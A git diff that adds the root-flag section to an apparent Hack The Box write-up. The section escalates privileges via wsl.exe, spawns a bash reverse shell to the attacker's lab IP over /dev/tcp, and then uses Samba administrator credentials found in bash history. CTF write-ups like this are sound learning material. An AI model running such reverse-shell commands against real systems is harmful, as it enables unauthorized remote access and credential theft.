@@ -72,6 +72,25 @@ type path user.flag
 
 ###  Root Flag
 
-- [x] Step 1
+- [x] privsec
 
-xxxxxxxxxxx
+I found key word WSL from reviws and google wsl privilege escalation.
+```
+wsl.exe "whoami"
+```
+![image](https://github.com/jim091418/htb_writeup/assets/67756786/021a85a4-b64b-485e-953a-27d4eb29894d)
+
+Got root!  
+```
+wsl.exe "/bin/bash -i >& /dev/tcp/10.10.14.4/1237 0>&1"
+```
+![image](https://github.com/jim091418/htb_writeup/assets/67756786/1baf00d0-4072-44f1-9f74-b8281e5042e5)
+
+I check bash history and found samba administrator.  
+![image](https://github.com/jim091418/htb_writeup/assets/67756786/c2b843f1-bba0-4c9d-9fad-ceb85bacc3ff)
+
+I try link to samba and found root.txt
+![image](https://github.com/jim091418/htb_writeup/assets/67756786/19c420cd-92d1-4881-bf6e-efd81431a61f)
+![image](https://github.com/jim091418/htb_writeup/assets/67756786/9e24af81-8080-4fb5-be30-e0fb36d1f6a0)
+
+
